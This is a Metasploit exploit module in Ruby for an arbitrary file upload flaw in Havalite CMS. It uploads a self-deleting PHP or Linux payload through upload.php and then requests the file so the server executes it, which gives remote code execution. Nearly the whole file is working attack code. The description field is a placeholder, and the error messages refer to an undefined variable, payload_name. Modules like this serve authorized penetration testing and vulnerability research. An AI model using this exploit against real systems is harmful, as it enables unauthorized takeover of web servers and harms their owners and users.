##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::PhpEXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Havalite CMS Arbitary File Upload Vulnerability",
			'Description'    => %q{Module Description},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'CWH',
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '80768'],
					['EDB', '26243']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'Platform'       => ['linux', 'php'],
			'Targets'        =>
				[
					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],
					[ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Mar 30 2013",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('TARGETURI', [true, 'The base path to havalite', '/havalite/'])
				], self.class)
	end


	def peer
		"#{rhost}:#{rport}"
	end


	#
	# Uploads our malicious file
	#
	def upload(base)
		p     = get_write_exec_payload(:unlink_self=>true)
		fname = 'payload.php'

		data = Rex::MIME::Message.new
		data.add_part(p, nil, nil, "form-data; name=\"files[]\"; filename=\"#{fname}\"")
		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

		res = send_request_cgi({
			'method' => 'POST',
			'uri'    => normalize_uri(base, 'upload.php'),
			'data'   => post_data
		})

		if not res
			fail_with(Exploit::Failure::Unknown, "#{peer} - Request timed out while uploading")
		elsif res.code.to_i == 404
			fail_with(Exploit::Failure::NotFound, "#{peer} - No upload.php found")
		elsif res.code.to_i != 200
			fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Unknown response. Server returns: #{res.code.to_s}")
		end

		return fname
	end


	#
	# Executes our uploaded malicious file
	#
	def exec(base, payload_fname)
		res = send_request_raw({
			'method' => 'GET',
			'uri'    => normalize_uri(base, 'tmp', 'files', payload_fname)
		})

		if not res
			fail_with(Exploit::Failure::Unknown, "#{peer} - Request timed out while executing #{payload_name}")
		elsif res.code.to_i == 404
			fail_with(Exploit::Failure::NotFound, "#{peer} - Not found: #{payload_name}. The upload probably failed")
		end
	end


	def exploit
		base = target_uri.path

		print_status("#{peer} - Uploading malicious file...")
		fname = upload(base)

		print_status("#{peer} - Executing #{fname}...")
		exec(base, fname)
	end
end